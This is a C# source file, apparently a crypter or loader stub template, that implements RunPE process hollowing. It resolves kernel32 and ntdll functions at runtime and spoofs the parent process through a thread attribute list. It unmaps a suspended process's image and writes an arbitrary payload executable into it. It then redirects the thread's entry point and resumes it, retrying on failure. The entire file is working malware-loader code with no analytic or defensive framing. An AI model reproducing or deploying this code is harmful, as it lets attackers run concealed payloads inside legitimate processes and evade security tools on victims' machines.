using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public partial class __Stub
{
	/// <summary>
	/// void RunPE(string path, string commandLine, byte[] payload)
	/// </summary>
	public static void __RunPE(string __path, string __commandLine, byte[] __payload)
	{
		// Get WinAPI functions
		__OpenProcessDelegate openProcess = __GetFunction<__OpenProcessDelegate>(/**/"kernel32.dll", /**/"OpenProcess");
		__CreateProcessDelegate createProcess = __GetFunction<__CreateProcessDelegate>(/**/"kernel32.dll", /**/"CreateProcessW");
		__GetLastErrorDelegate getLastError = __GetFunction<__GetLastErrorDelegate>(/**/"kernel32.dll", /**/"GetLastError");
		__NtQueryInformationProcessDelegate ntQueryInformationProcess = __GetFunction<__NtQueryInformationProcessDelegate>(/**/"ntdll.dll", /**/"NtQueryInformationProcess");
		__NtAllocateVirtualMemoryDelegate ntAllocateVirtualMemory = __GetFunction<__NtAllocateVirtualMemoryDelegate>(/**/"ntdll.dll", /**/"NtAllocateVirtualMemory");
		__NtWriteVirtualMemoryDelegate ntWriteVirtualMemory = __GetFunction<__NtWriteVirtualMemoryDelegate>(/**/"ntdll.dll", /**/"NtWriteVirtualMemory");
		__NtUnmapViewOfSectionDelegate ntUnmapViewOfSection = __GetFunction<__NtUnmapViewOfSectionDelegate>(/**/"ntdll.dll", /**/"NtUnmapViewOfSection");
		__NtSetContextThreadDelegate ntSetContextThread = __GetFunction<__NtSetContextThreadDelegate>(/**/"ntdll.dll", /**/"NtSetContextThread");
		__NtGetContextThreadDelegate ntGetContextThread = __GetFunction<__NtGetContextThreadDelegate>(/**/"ntdll.dll", /**/"NtGetContextThread");
		__NtResumeThreadDelegate ntResumeThread = __GetFunction<__NtResumeThreadDelegate>(/**/"ntdll.dll", /**/"NtResumeThread");
		__InitializeProcThreadAttributeListDelegate initializeProcThreadAttributeList = __GetFunction<__InitializeProcThreadAttributeListDelegate>(/**/"kernel32.dll", /**/"InitializeProcThreadAttributeList");
		__UpdateProcThreadAttributeDelegate updateProcThreadAttribute = __GetFunction<__UpdateProcThreadAttributeDelegate>(/**/"kernel32.dll", /**/"UpdateProcThreadAttribute");

		// Retry up to 5 times
		for (int i = /**/0; i < /**/5; i++)
		{
			int processId = /**/0;

			try
			{
				// Parse executable
				int ntHeader = BitConverter.ToInt32(__payload, /**/0x3c);
				int sizeOfImage = BitConverter.ToInt32(__payload, ntHeader + /**/0x18 + /**/0x38);
				int sizeOfHeaders = BitConverter.ToInt32(__payload, ntHeader + /**/0x18 + /**/0x3c);
				int entryPoint = BitConverter.ToInt32(__payload, ntHeader + /**/0x18 + /**/0x10);
				short numberOfSections = BitConverter.ToInt16(__payload, ntHeader + /**/0x6);
				short sizeOfOptionalHeader = BitConverter.ToInt16(__payload, ntHeader + /**/0x14);
				IntPtr imageBase = IntPtr.Size == /**/4 ? (IntPtr)BitConverter.ToInt32(__payload, ntHeader + /**/0x18 + /**/0x1c) : (IntPtr)BitConverter.ToInt64(__payload, ntHeader + /**/0x18 + /**/0x18);

				// Get parent process ID
				IntPtr processBasicInformation = Marshal.AllocHGlobal(IntPtr.Size * /**/6);
				if (ntQueryInformationProcess((IntPtr)(/**/-1), /**/0, processBasicInformation, (uint)(IntPtr.Size * /**/6), (IntPtr)/**/0) != /**/0) throw new Exception();
				int parentProcessId = Marshal.ReadInt32(processBasicInformation, IntPtr.Size * /**/5);

				// Get parent process handle
				IntPtr parentProcessHandle = openProcess(/**/0x80, false, parentProcessId);
				if (parentProcessHandle == (IntPtr)/**/0) throw new Exception();

				IntPtr parentProcessHandlePtr = __Allocate(IntPtr.Size);
				Marshal.WriteIntPtr(parentProcessHandlePtr, parentProcessHandle);

				// Get size of PROC_THREAD_ATTRIBUTE_LIST
				IntPtr attributeListSize = (IntPtr)/**/0;
				if (initializeProcThreadAttributeList((IntPtr)/**/0, /**/1, /**/0, ref attributeListSize) || attributeListSize == (IntPtr)/**/0) throw new Exception();

				// Initialize attribute list
				IntPtr attributeList = __Allocate((int)attributeListSize);
				if (!initializeProcThreadAttributeList(attributeList, /**/1, /**/0, ref attributeListSize) ||
					attributeList == (IntPtr)/**/0 ||
					!updateProcThreadAttribute(attributeList, (uint)/**/0, (IntPtr)/**/0x20000, parentProcessHandlePtr, (IntPtr)IntPtr.Size, (IntPtr)/**/0, (IntPtr)/**/0)) throw new Exception();

				// Use STARTUPINFOEX to implement parent process spoofing
				int startupInfoLength = IntPtr.Size == /**/4 ? /**/0x48 : /**/0x70;
				IntPtr startupInfo = __Allocate(startupInfoLength);
				Marshal.Copy(new byte[startupInfoLength], /**/0, startupInfo, startupInfoLength);
				Marshal.WriteInt32(startupInfo, startupInfoLength);
				Marshal.WriteIntPtr(startupInfo, startupInfoLength - IntPtr.Size, attributeList);

				// Create process
				byte[] processInfo = new byte[IntPtr.Size == /**/4 ? /**/0x10 : /**/0x18];
				if (!createProcess(__path, __commandLine, (IntPtr)/**/0, (IntPtr)/**/0, true, (uint)/**/0x80004, (IntPtr)/**/0, null, startupInfo, processInfo))
				{
					// If GetLastError == ERROR_ELEVATION_REQUIRED, repeat without parent process ID spoofing
					if (getLastError() == /**/0x2e4)
					{
						if (!createProcess(__path, __commandLine, (IntPtr)/**/0, (IntPtr)/**/0, true, (uint)/**/0x4, (IntPtr)/**/0, null, startupInfo, processInfo))
						{
							throw new Exception();
						}
					}
					else
					{
						throw new Exception();
					}
				}

				processId = BitConverter.ToInt32(processInfo, IntPtr.Size * /**/2);
				IntPtr process = IntPtr.Size == /**/4 ? (IntPtr)BitConverter.ToInt32(processInfo, /**/0) : (IntPtr)BitConverter.ToInt64(processInfo, /**/0);

				// Unmap process memory
				ntUnmapViewOfSection(process, imageBase);

				// Write section headers
				IntPtr sizeOfImagePtr = (IntPtr)sizeOfImage;
				if (ntAllocateVirtualMemory(process, ref imageBase, (IntPtr)/**/0, ref sizeOfImagePtr, (uint)/**/0x3000, (uint)/**/0x40) < /**/0 ||
					ntWriteVirtualMemory(process, imageBase, __payload, sizeOfHeaders, (IntPtr)/**/0) < /**/0) throw new Exception();

				// Write sections
				for (short j = (short)/**/0; j < numberOfSections; j++)
				{
					byte[] section = new byte[/**/0x28];
					Buffer.BlockCopy(__payload, ntHeader + /**/0x18 + sizeOfOptionalHeader + j * /**/0x28, section, /**/0, /**/0x28);

					int virtualAddress = BitConverter.ToInt32(section, /**/0xc);
					int sizeOfRawData = BitConverter.ToInt32(section, /**/0x10);
					int pointerToRawData = BitConverter.ToInt32(section, /**/0x14);

					byte[] rawData = new byte[sizeOfRawData];
					Buffer.BlockCopy(__payload, pointerToRawData, rawData, /**/0, rawData.Length);

					// Write RawData to target process
					if (ntWriteVirtualMemory(process, imageBase + virtualAddress, rawData, rawData.Length, (IntPtr)/**/0) < /**/0) throw new Exception();
				}

				// Get thread context
				IntPtr thread = IntPtr.Size == /**/4 ? (IntPtr)BitConverter.ToInt32(processInfo, /**/4) : (IntPtr)BitConverter.ToInt64(processInfo, /**/8);
				IntPtr context = __Allocate(IntPtr.Size == /**/4 ? /**/0x2cc : /**/0x4d0);
				Marshal.WriteInt32(context, IntPtr.Size == /**/4 ? /**/0 : /**/0x30, /**/0x10001b);
				if (ntGetContextThread(thread, context) < /**/0) throw new Exception();

				// Write base address and entry point
				if (IntPtr.Size == /**/4)
				{
					IntPtr ebx = (IntPtr)Marshal.ReadInt32(context, /**/0xa4);
					if (ntWriteVirtualMemory(process, (IntPtr)((int)ebx + /**/8), BitConverter.GetBytes((int)imageBase), /**/4, (IntPtr)/**/0) < /**/0) throw new Exception();
					Marshal.WriteInt32(context, /**/0xb0, (int)imageBase + entryPoint);
				}
				else
				{
					IntPtr rdx = (IntPtr)Marshal.ReadInt64(context, /**/0x88);
					if (ntWriteVirtualMemory(process, rdx + /**/16, BitConverter.GetBytes((long)imageBase), /**/8, (IntPtr)/**/0) < /**/0) throw new Exception();
					Marshal.WriteInt64(context, /**/0x80, (long)imageBase + entryPoint);
				}

				// Set thread context
				if (ntSetContextThread(thread, context) < /**/0) throw new Exception();

				// Resume thread
				uint suspendCount;
				if (ntResumeThread(thread, out suspendCount) == /**/-1) throw new Exception();
			}
			catch
			{
				try
				{
					// If the current attempt failed, terminate the created process to not have suspended leftover processes.
					Process.GetProcessById(processId).Kill();
				}
				catch
				{
				}

				continue;
			}

			break;
		}
	}

	/// <summary>
	/// IntPtr Allocate(int size)
	/// </summary>
	private static IntPtr __Allocate(int __size)
	{
		int alignment = IntPtr.Size == /**/4 ? /**/1 : /**/16;
		return (IntPtr)((long)(Marshal.AllocHGlobal(__size + alignment / /**/2) + alignment - /**/1) / alignment * alignment);
	}
}